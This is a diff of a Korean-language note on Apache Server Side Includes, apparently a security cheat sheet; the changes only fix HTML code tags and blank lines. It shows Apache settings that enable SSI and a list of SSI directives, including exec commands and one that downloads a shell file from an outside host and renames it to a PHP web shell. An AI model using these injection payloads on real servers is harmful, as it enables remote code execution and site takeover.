@@ -18,9 +18,8 @@ ln -s /etc/apache2/mods-available/include.load /etc/apache2/mods-enabled
 
 ### httpd.conf 또는 /etc/apache2/sites-available/000-default 파일 편집
 
-<code><pre>
-
-＜Directory />
+<pre><code>
+＜Directory>
     Options FollowSymLinks Includes
     AllowOverride All
     Order allow,deny
@@ -28,13 +27,11 @@ ln -s /etc/apache2/mods-available/include.load /etc/apache2/mods-enabled
     AddType text/html .shtml
     AddOutputFilter INCLUDES .shtml
 ＜/Directory>
-
-</pre></code>
+</code></pre>
 
 ### 사용 가능 구문
 
 <pre><code>
-
 ＜!--#exec cmd="ls" -->
 ＜!--#exec cmd="cd /root/dir/">
 ＜!--#exec cmd="wget http://mysite.com/shell.txt | rename shell.txt shell.php" -->
@@ -46,5 +43,4 @@ ln -s /etc/apache2/mods-available/include.load /etc/apache2/mods-enabled
 ＜!--#config timefmt="A %B %d %Y %r"-->
 ＜!--#fsize file="ssi.shtml" -->
 ＜!--#include file=”UUUUUUUU...UU”-->
-
 </code></pre>
